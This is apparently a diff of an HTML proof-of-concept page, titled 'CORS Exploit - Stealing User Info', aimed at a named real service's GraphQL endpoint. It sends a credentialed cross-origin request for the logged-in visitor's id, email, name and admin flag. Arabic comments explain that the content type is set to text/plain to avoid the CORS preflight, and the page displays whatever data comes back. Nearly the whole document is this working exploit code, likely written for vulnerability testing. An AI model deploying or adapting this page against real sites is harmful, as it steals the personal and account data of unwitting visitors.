@@ -1,30 +1,51 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS Misconfiguration PoC</title>
+    <meta charset="UTF-8">
+    <title>CORS Exploit Bypass Test</title>
 </head>
 <body>
     <h1>CORS Exploit - Stealing User Info</h1>
+    <div id="status" style="font-weight: bold; color: blue;">Sending Request...</div>
+    <pre id="output" style="background: #f4f4f4; padding: 10px; border: 1px solid #ccc;"></pre>
+
     <script>
-        // إرسال الطلب مع الـ Cookies والتأكد من قراءة البيانات
-        fetch('https://app.segment.com/gateway-api/graphql?operation=getUserInfo', { // ضع الـ Endpoint الصحيح هنا
+        const statusDiv = document.getElementById('status');
+        const outputPre = document.getElementById('output');
+
+        const targetUrl = 'https://app.segment.com/gateway-api/graphql?operation=getUserInfo'; 
+
+        const requestData = {
+            "operationName": "getUserInfo",
+            "variables": {},
+            "query": "query getUserInfo {\n  me {\n    id\n    email\n    name\n    isAdmin\n  }\n}"
+        };
+
+        // نستخدم text/plain عشان المتصفح ميعملش OPTIONS Preflight
+        fetch(targetUrl, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
+                'Content-Type': 'text/plain' 
             },
-            credentials: 'include', // هيتبعث معاه الـ Cookies تلقائياً
-            body: JSON.stringify({
-                "operationName": "getUserInfo",
-                "variables": {},
-                "query": "query getUserInfo {\n  me {\n    id\n    email\n    name\n    isAdmin\n  }\n}"
-            })
+            credentials: 'include',
+            body: JSON.stringify(requestData)
         })
-        .then(response => response.json())
-        .then(data => {
-            alert('Stolen Data:\n' + JSON.stringify(data, null, 2));
-            console.log(data);
+        .then(async response => {
+            const rawText = await response.text();
+            statusDiv.innerHTML = Response Status: ${response.status} ${response.statusText};
+            
+            try {
+                const data = JSON.parse(rawText);
+                outputPre.innerText = JSON.stringify(data, null, 2);
+            } catch (e) {
+                outputPre.innerText = "Raw Response:\n" + rawText;
+            }
         })
-        .catch(err => console.error('Error:', err));
+        .catch(error => {
+            statusDiv.innerHTML = <span style="color:red;">Error: ${error.message}</span>;
+            outputPre.innerText = "Check Console for details.";
+        });
     </script>
 </body>
 </html>
